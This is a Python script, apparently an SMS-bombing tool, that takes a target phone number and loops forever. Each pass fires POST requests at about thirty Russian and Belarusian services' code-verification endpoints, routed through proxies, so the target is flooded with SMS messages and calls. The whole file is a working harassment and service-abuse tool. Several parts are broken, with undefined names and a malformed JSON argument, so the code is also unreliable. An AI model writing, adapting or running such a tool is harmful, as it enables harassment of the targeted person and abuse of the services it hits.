import requests
from colorama import init, Fore, Back, Style
from time import sleep
import urllib.request
init()

proxies = {
    'http':'119.110.75.182:8080',
    'http':'172.104.51.188:8080',
    'http':'113.128.11.93:9999',
    'http': '193.136.119.21:80',
    'http': '46.45.129.16:80',
    'http': '167.172.248.53:80',
    'http': '138.201.223.250:31288',
    'http': '136.243.47.220:3128',
    'http': '91.225.104.182:80'
}

print(Fore.GREEN + Back.BLACK + Style.BRIGHT + '''
 ______   _______  _______  _______  _______  _______ 
(  __  \ (  ____ \(       )(  ___  )/ ___   )(  ___  )
| (  \  )| (    \/| () () || (   ) |\/   )  || (   ) |
| |   ) || (__    | || || || |   | |    /   )| (___) |
| |   | ||  __)   | |(_)| || |   | |   /   / |  ___  |
| |   ) || (      | |   | || |   | |  /   /  | (   ) |
| (__/  )| (____/\| )   ( || (___) | /   (_/\| )   ( |
(______/ (_______/|/     \|(_______)(_______/|/     \|                                              
''' + Style.RESET_ALL)

print('\tChecking For Updates...')
ver = urllib.request.urlopen(
    "https://raw.githubusercontent.com/demoza/Reborn/master/.version").read().decode('utf-8')
verl = ''
try:
    verl = open(".version", 'r').read()
except Exception:
    pass
if ver != verl:
    print('\n\t\tAn Update is Available....')
    print('\tStarting Update...')
    update()
print("Your Version is Up-To-Date")
print('\n\n\t\t\tStarting Reborn...\n\n')
try:
    noti = urllib.request.urlopen(
        "https://raw.githubusercontent.com/demoza/Reborn/master/.notify").read().decode('utf-8')
    noti = noti.upper().strip()
    if len(noti) > 10:
        print('\n\n\tNOTIFICATION: ' + noti + '\n\n')
except Exception:
    pass
    

a = input('Select target Number :')
b = 999
class services():
	# service number 1
	def service1(self, a, proxies):
		r = requests.post('https://youla.ru/web-api/auth/request_code',
			data = {"phone":a}, proxies=proxies)
		print('youla.ru ' + str(r.status_code))

	# service number 2
	def service2(self, a, proxies):
		r = requests.post('https://api.sunlight.net/v3/customers/authorization/',
			data = {"phone":a}, proxies=proxies)
		print('sunlight.net ' + str(r.status_code))

	# service number 3
	def service3(self, a, proxies):
		r = requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
			data = {"phone_number":a}, proxies=proxies)
		print('tinder.com ' + str(r.status_code))

	# service number 4
	def service4(self, a, proxies):
		r = requests.post('https://api.tinkoff.ru/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=RznyziZkeagDbs6SLIr13ZlfSjusxJbQ.m1-prod-api26&wuid=31ad89052c4944fd8cd55bcf419eefc1',
			data = {"phone":a}, proxies=proxies)
		print('tinkoff.ru ' + str(r.status_code))

	# service number 5
	def service5(self, a, proxies):
		r = requests.post('https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?oper=9&phone=79821432646',
			data = {"phone":a,"oper":"9"})
		print('sipnet.ru ' + str(r.status_code))

	# service number 7
	def service7(self, a, proxies):
		r = requests.post('https://rutube.ru/api/accounts/sendpass/phone?phone=%2B79195346628',
			data = {"phone":a}, proxies=proxies)
		print('rutube.ru ' + str(r.status_code))

	# service number 8
	def service8(self, a, proxies):
		r = requests.post('https://client.taximaxim.com/site/send-code/?type=0',
			data = {"_csrf":"SuyaDpUnfWWvTkF8GytL1zAJqUUvLMc_SUXaEGhXsoQa2tJvwF8nC_YJEQpaHhKkVGCRIhljrggQJ4ljCW-G4Q==","LoginForm[org]":"maxim","LoginForm[country]":"ru","LoginForm[baseId]":"11","LoginForm[phone]":a,"LoginForm[code]":"","LoginForm[agree]":"0"}, proxies=proxies)
		print('taximaxim.com ' + str(r.status_code))

	# service number 9
	def service9(self, a, proxies):
		r = requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
			data={"st.r.phone": a}, proxies=proxies)
		print('ok.ru ' + str(r.status_code))

	# service number 10	
	def service10(self, a, proxies):
		r = requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",
			data={"phone": a}, proxies=proxies)
		print('prime.anytime.global ' + str(r.status_code))

	# service number 11
	def service11(self, a, proxies):
		r = requests.post('https://belkacar.ru/get-confirmation-code',
			data = {"phone": a}, proxies=proxies)
		print('belkacar.ru ' + str(r.status_code))

	# service number 12
	def service12(self, a, proxies):
		r = requests.post('https://api.delitime.ru/api/v2/signup', 
			data={"SignupForm[username]": a, "SignupForm[device_type]": 3}, proxies=proxies)
		print('delitime.ru ' + str(r.status_code))

	# service number 13
	def service13(self, a, proxies):
		r = requests.post('https://www.delivery-club.ru/ajax/user_otp',
			data={"phone": a}, proxies=proxies)
		print('delivery-club.ru ' + str(r.status_code))

    # service number 14
	def service14(self, a, proxies):
		r = requests.post('https://findclone.ru/register',
			params={'phone': a}, proxies=proxies)
		print('findclone.ru ' + str(r.status_code))

	# service number 15
	def service15(self, a, proxies):
		r = requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
			data={'msisdn': a, "locale": 'en', 'countryCode': 'ru',
			'version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, proxies=proxies)
		print('icq.com ' + str(r.status_code))

	# service number 16
	def service16(self, a, proxies):
		r = requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
			data={"mode": "request", "phone": a,
				"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6",
				"osversion": "unknown", "devicemodel": "unknown"}, proxies=proxies)
		print('indriver.com ' + str(r.status_code))

	# service number 17
	def service17(self, a, proxies):
		r = requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',
			json={"phone": a}, proxies=proxies)
		print('ube.pmsm.org.ru ' + str(r.status_code))

	# service number 18
	def service18(self, a, proxies):
		r = requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms',
			json={'phone': a}, proxies=proxies)
		print('kfc.ru ' + str(r.status_code))

	# service number 19
	def service19(self, a, proxies):
		r = requests.post('https://cloud.mail.ru/api/v2/notify/applink',
			json={"phone": a, "api": 2, "email": "email",
				"x-email": "x-email"}, proxies=proxies)
		print('mail.ru ' + str(r.status_code))

	# service number 20
	def service20(self, a, proxies):
		r = requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",
    		json={"phone": a}, proxies=proxies)
		print('qlean.ru ' + str(r.status_code))

	# service number 21
	def service21(self, a, proxies):
		r = requests.post("https://api.wowworks.ru/v2/site/send-code",
			json={"phone": a, "type": 2}, proxies=proxies)
		print('wowworks.ru ' + str(r.status_code))

	# service number 22
	def service22(self, a, proxies):
		r = requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
			json={"phone_number": a}, proxies=proxies)
		print('eda.yandex ' + str(r.status_code))

	# service number 23
	def service23(self, a, proxies):
		r = requests.post('https://fix-price.ru/ajax/register_phone_code.php',
			data = {"register_call": "Y",
				"action": "getCode",
				"phone": a}, proxies=proxies)
		print('fix-price.ru ' + str(r.status_code))

	# service number 24
	def service24(self, a, proxies):
		r = requests.post('https://vkusvill.ru/ajax/user_v2/auth/check_phone.php',
			data={'USER_PHONE': a, 'token': '*','is_retry': 'Y'},
			proxies=proxies)
		print('vkusvill.ru ' + str(r.status_code))

	# service number 25
	def service25(self, a, proxies):
		r= requests.post('https://service.uramobil.ru/profile/smstoken',
			json={{'PhoneNumber': a, 'Captcha': 'rasd'}}, headers={},
			proxies=proxies)
		print('service,uramobil.ru ' + str(r.status_code))

	# service number 26
	def service26(self, a, proxies):
		r = requests.post('http://taxiseven.ru/auth/register',
			data={'phone': a}, headers={},
			proxies=proxies)
		print('taxiseven.ru ' + str(r.status_code))

	# service number 27
	def service27(self, a, proxies):
		r = requests.post('https://pizzahut.ru/account/password-reset',
			data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': phonePizzahut, '_token':'*'},
			proxies=proxies)
		print('pizzahut.ru ' + str(r.status_code))

	# service number 28
	def service28(self, a, proxies):
		r = requests.post('https://www.rabota.ru/remind',
			data={'credential': phone},
			proxies=proxies)
		print('rabota.ru ' + str(r.status_code))

	# service number 29
	def service29(self, a, proxies):
		r = requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',
			json={'phone':phone},
			proxies=proxies)
		print('lenta.com ' + str(r.status_code))

	# service number 30
	def service30(self, a, proxies):
		r = requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': a})
		print('invitro.ru ' + str(r.status_cod))

	# service number 31
	def service31(self, a, proxies):
		r = requests.post('https://online.sbis.ru/reg/service/',
			json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':a},'id':'1'},
			proxies=proxies)
		print('sbis.ru ' + str(r.status_code))

	# service number 32
	def service32(self, a, proxies):
		r = requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru',
			data={'phone': a},
			proxies=proxies)
		print('beltelecom.by ' + str(r.status_code))

while 1:
	services().service1(a,proxies)
	sleep(b)
	services().service2(a,proxies)
	sleep(b)
	services().service3(a,proxies)
	sleep(b)
	services().service4(a,proxies)
	sleep(b)
	services().service5(a,proxies)
	sleep(b)
	services().service7(a,proxies)
	sleep(b)
	services().service8(a,proxies)
	sleep(b)
	services().service8(a,proxies)
	sleep(b)
	services().service9(a,proxies)
	sleep(b)
	services().service10(a,proxies)
	sleep(b)
	services().service12(a,proxies)
	sleep(b)
	services().service13(a,proxies)
	sleep(b)
	services().service14(a,proxies)
	sleep(b)
	services().service15(a,proxies)
	sleep(b)
	services().service16(a,proxies)
	sleep(b)
	services().service17(a,proxies)
	sleep(b)
	services().service18(a,proxies)
	sleep(b)
	services().service19(a,proxies)
	sleep(b)
	services().service20(a,proxies)
	sleep(b)
	services().service21(a,proxies)
	sleep(b)
	services().service22(a,proxies)
	sleep(b)
	services().service23(a,proxies)
	sleep(b)
	services().service24(a,proxies)
	sleep(b)
	services().service26(a,proxies)
	sleep(b)
	services().service27(a,proxies)
	sleep(b)
	services().service28(a,proxies)
	sleep(b)
	services().service29(a,proxies)
	sleep(b)
	services().service30(a,proxies)
	sleep(b)
	services().service31(a,proxies)
	sleep(b)
	services().service32(a,proxies)
	sleep(b)